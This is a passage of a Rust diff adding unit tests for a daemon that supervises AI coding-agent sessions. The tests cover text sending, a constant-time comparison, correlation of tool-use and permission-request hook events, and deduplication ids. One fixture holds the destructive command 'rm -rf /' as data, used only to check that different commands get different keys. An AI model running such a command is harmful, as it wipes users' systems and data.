+        let hash = protocol::hash::send_text_hash(uid, text, true);
+        daemon.unregister_supervisor(&pane._registration).await;
+
+        let refused = daemon
+            .send_text(uid, text.to_string(), Some("st-1"), Some(&hash), true)
+            .await;
+        assert!(
+            matches!(&refused, SendTextResult::Refused { reason } if reason.contains("no supervisor")),
+            "{refused:?}"
+        );
+
+        // The claim was released, so the same identity works once a supervisor
+        // is back rather than being stuck as a permanent unknown.
+        let pane = attach(&daemon, "cc-1", uid, COMPOSER_PANE, "").await;
+        assert!(matches!(
+            daemon
+                .send_text(uid, text.to_string(), Some("st-1"), Some(&hash), true)
+                .await,
+            SendTextResult::Sent { .. }
+        ));
+        assert_eq!(pane.typed(), vec![text.to_string()]);
+    }
+
+    #[test]
+    fn constant_time_eq_behaves_like_eq() {
+        assert!(constant_time_eq(b"abc", b"abc"));
+        assert!(!constant_time_eq(b"abc", b"abd"));
+        assert!(!constant_time_eq(b"abc", b"ab"));
+        assert!(constant_time_eq(b"", b""));
+    }
+
+    #[test]
+    fn correlation_key_is_stable_for_the_same_call() {
+        let pre = input_from(
+            r#"{"hook_event_name":"PreToolUse","prompt_id":"p1","tool_name":"Bash",
+                "tool_input":{"command":"touch /tmp/a"},"tool_use_id":"toolu_1"}"#,
+        );
+        let perm = input_from(
+            r#"{"hook_event_name":"PermissionRequest","prompt_id":"p1","tool_name":"Bash",
+                "tool_input":{"command":"touch /tmp/a"}}"#,
+        );
+        assert_eq!(
+            correlation_key("cc-1", &pre),
+            correlation_key("cc-1", &perm),
+            "PermissionRequest must join to its PreToolUse"
+        );
+    }
+
+    #[test]
+    fn correlation_key_separates_different_commands() {
+        let a = input_from(
+            r#"{"prompt_id":"p1","tool_name":"Bash","tool_input":{"command":"touch /tmp/a"}}"#,
+        );
+        let b = input_from(
+            r#"{"prompt_id":"p1","tool_name":"Bash","tool_input":{"command":"rm -rf /"}}"#,
+        );
+        assert_ne!(correlation_key("cc-1", &a), correlation_key("cc-1", &b));
+    }
+
+    #[test]
+    fn correlation_key_separates_sessions() {
+        let input =
+            input_from(r#"{"prompt_id":"p1","tool_name":"Bash","tool_input":{"command":"ls"}}"#);
+        assert_ne!(
+            correlation_key("cc-1", &input),
+            correlation_key("cc-2", &input)
+        );
+    }
+
+    #[test]
+    fn correlation_key_absent_without_tool_details() {
+        assert!(correlation_key("cc-1", &input_from(r#"{"prompt_id":"p1"}"#)).is_none());
+    }
+
+    #[test]
+    fn tool_events_get_distinct_dedup_ids() {
+        let input = input_from(
+            r#"{"hook_event_name":"PreToolUse","tool_use_id":"toolu_1","tool_name":"Bash"}"#,
+        );
+        let pre = hook_event(&test_key(), &HookEventName::PreToolUse, &json!({}), &input);
+        let post = hook_event(&test_key(), &HookEventName::PostToolUse, &json!({}), &input);
+        assert_eq!(pre.source_event_id.as_deref(), Some("pre:toolu_1"));
+        assert_eq!(post.source_event_id.as_deref(), Some("post:toolu_1"));
+        assert_ne!(pre.source_event_id, post.source_event_id);
+    }
+
+    #[test]
+    fn notifications_get_no_dedup_id() {
+        // Two identical idle notifications are two real facts.
+        let input =
+            input_from(r#"{"hook_event_name":"Notification","notification_type":"idle_prompt"}"#);
+        let event = hook_event(
+            &test_key(),
+            &HookEventName::Notification,
+            &json!({}),
+            &input,
+        );
+        assert_eq!(event.source_event_id, None);
+    }
+}
